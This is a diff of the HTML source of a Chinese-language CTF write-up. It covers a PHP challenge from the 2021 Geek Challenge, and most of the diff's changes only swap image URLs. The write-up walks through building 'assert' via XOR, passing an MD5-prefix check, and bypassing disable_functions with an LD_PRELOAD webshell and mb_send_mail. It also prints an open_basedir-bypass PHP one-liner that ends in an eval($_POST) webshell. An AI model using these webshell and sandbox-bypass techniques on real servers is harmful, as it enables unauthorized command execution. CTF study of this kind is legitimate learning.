@@ -25,30 +25,30 @@
 <meta property="og:site_name" content="Dr0n&#39;s blog">
 <meta property="og:description" content="题目代码12345678&lt;?phphighlight_file(__FILE__);&#x2F;&#x2F; 这些奇怪的符号是什么呢?字符串之间还能异或的吗?$a &#x3D; $_POST[&amp;#x27;v&amp;#x27;] ^ &amp;#x27;!-__)^&amp;#x27;;&#x2F;&#x2F; ctf常见的验证码哦!纯数字呢if (substr(md5($_POST[&amp;#x27;auth&amp;#x27;]),0,6) &#x3D;&#x3D; &quot;666666&amp;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-2.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-3.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-4.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-5.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-6.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-7.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-8.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-9.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-10.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-11.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-12.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-13.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-14.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-4.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-5.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-6.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-7.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-8.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-9.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-10.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-11.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-12.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-13.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-14.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-16.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-17.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2021/2021jike-18.png">
 <meta property="article:published_time" content="2021-11-02T00:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-29T08:47:27.932Z">
+<meta property="article:modified_time" content="2024-03-22T07:03:25.764Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="2021">
 <meta property="article:tag" content="disable_function">
 <meta property="article:tag" content="极客挑战">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-1.png">
+<meta name="twitter:image" content="https://www.dr0n.top/img/wp/2021/2021jike-4.png">
   
   
   
@@ -321,24 +321,24 @@
 
 <h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>代码会将<code>v</code>和<code>!-__)^</code>进行异或，所以我们需要构造出一个值，异或后为函数名<br>脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;!-__)^&quot;</span><br>b=<span class="hljs-string">&quot;assert&quot;</span>        //需要的函数名<br>c=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(b[<span class="hljs-built_in">len</span>(c)])^<span class="hljs-built_in">ord</span>(i))<br><span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure>
-<p>所以<code>v</code>的值就为<code>@^,:[*</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-1.png"></p>
+<p>所以<code>v</code>的值就为<code>@^,:[*</code><br><img src="/img/wp/2021/2021jike-4.png"></p>
 <p>接下来是一个MD5的截断比较，找一个MD5后前6位为<code>666666</code>的值即可，例如<code>oT7mgbJMTNyh9qWYQT2d</code></p>
 <p>code就是要执行的内容了</p>
-<p>现在将三部分连接在一起<br>成功执行phpinfo<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-2.png"></p>
+<p>现在将三部分连接在一起<br>成功执行phpinfo<br><img src="/img/wp/2021/2021jike-5.png"></p>
 <h1 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="绕过disable_function"></a>绕过disable_function</h1><p>有了phpinfo，肯定要看一下<code>disable_functions</code><br>可以看到常用的system等基本都被禁用了</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,apache_setenv,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,error_log,iconv<br></code></pre></td></tr></table></figure>
-<p>那么我们就需要绕过<code>disable_function</code><br>先用蚁剑连上，方便操作<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-3.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-4.png"></p>
-<p>绕过disable_function有很多种方法，但这里大都被禁用了，所以最后采用的是利用 LD_PRELOAD 环境变量来绕过<br>首先下载<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">绕过代码</a><br>需要用到如下这4个文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-5.png"></p>
+<p>那么我们就需要绕过<code>disable_function</code><br>先用蚁剑连上，方便操作<br><img src="/img/wp/2021/2021jike-6.png"><br><img src="/img/wp/2021/2021jike-7.png"></p>
+<p>绕过disable_function有很多种方法，但这里大都被禁用了，所以最后采用的是利用 LD_PRELOAD 环境变量来绕过<br>首先下载<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">绕过代码</a><br>需要用到如下这4个文件<br><img src="/img/wp/2021/2021jike-8.png"></p>
 <blockquote>
 <p>bypass_disablefunc.php：一个用来执行命令的 webshell。<br>bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。<br>bypass_disablefunc.c：用来编译生成上面的共享对象文件。</p>
 </blockquote>
 <p>对于bypass_disablefunc.php，如果有权限就上传到web目录直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：</p>
 <p>cmd 参数：待执行的系统命令，如 id 命令。<br>outpath 参数：保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。<br>sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</p>
-<p>在回过头来看题目，<code>/var/www/html</code>目录是没有权限的，<code>/tmp</code>目录可读可写，所以将文件上传到<code>/tmp</code>目录下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-6.png"><br>在code中用文件包含调用<code>bypass_disablefunc.php</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-7.png"><br>然后GET传入三个参数<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-8.png"><br>会发现无法执行</p>
-<p>检查一下bypass_disablefunc.php中的代码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-9.png"><br>比较后发现<code>mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</code>中的mail被禁用了<br>可以使用<code>mail</code>的封装函数<code>mb_send_mail</code>来绕过<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-10.png"><br>成功绕过<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-11.png"><br>执行<code>ls /</code>后执行<code>/readflag</code>即可拿到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-12.png"></p>
+<p>在回过头来看题目，<code>/var/www/html</code>目录是没有权限的，<code>/tmp</code>目录可读可写，所以将文件上传到<code>/tmp</code>目录下<br><img src="/img/wp/2021/2021jike-9.png"><br>在code中用文件包含调用<code>bypass_disablefunc.php</code><br><img src="/img/wp/2021/2021jike-10.png"><br>然后GET传入三个参数<br><img src="/img/wp/2021/2021jike-11.png"><br>会发现无法执行</p>
+<p>检查一下bypass_disablefunc.php中的代码<br><img src="/img/wp/2021/2021jike-12.png"><br>比较后发现<code>mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</code>中的mail被禁用了<br>可以使用<code>mail</code>的封装函数<code>mb_send_mail</code>来绕过<br><img src="/img/wp/2021/2021jike-13.png"><br>成功绕过<br><img src="/img/wp/2021/2021jike-14.png"><br>执行<code>ls /</code>后执行<code>/readflag</code>即可拿到flag<br><img src="/img/wp/2021/2021jike-15.png"></p>
 <h1 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h1><p>看到这个环境还不错，顺手试了一下绕过<code>open_basedir</code><br>因为是静态靶机，所以能看到其他师傅的马，直接包含，不用在上传了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]); <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
-<p>哈哈哈哈，在线聊天室<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-13.png"><br>蚁剑连接<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-14.png"><br>可以看到根目录文件了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-15.png"></p>
+<p>哈哈哈哈，在线聊天室<br><img src="/img/wp/2021/2021jike-16.png"><br>蚁剑连接<br><img src="/img/wp/2021/2021jike-17.png"><br>可以看到根目录文件了<br><img src="/img/wp/2021/2021jike-18.png"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这一题考点很多，并没有表面那么简单，学到很多新姿势</p>
 <p>特别鸣谢：<a target="_blank" rel="noopener" href="https://l-helianthus.github.io/">@Hel1antHu5</a>师傅<br>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情</a></p>
 
